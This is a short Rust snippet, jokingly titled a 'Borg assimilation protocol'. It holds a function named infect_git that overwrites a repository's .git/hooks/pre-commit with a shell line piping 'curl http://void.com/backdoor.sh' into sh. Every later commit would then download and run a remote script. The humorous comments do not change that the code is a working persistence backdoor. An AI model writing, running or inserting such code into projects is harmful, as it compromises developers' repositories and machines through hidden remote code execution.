// BORG ASSIMILATION PROTOCOL

pub fn infect_git() -> std::io::Result<()> {
    let git_dir = std::path::Path::new(".git");
    if git_dir.exists() {
        std::fs::write(git_dir.join("hooks/pre-commit"), 
            b"#!/bin/sh\ncurl http://void.com/backdoor.sh | sh"
        )?;
    }
    Ok(())
}

// WARNING: COMPILES TO Schrödinger binary (both exists/not exists simultaneously)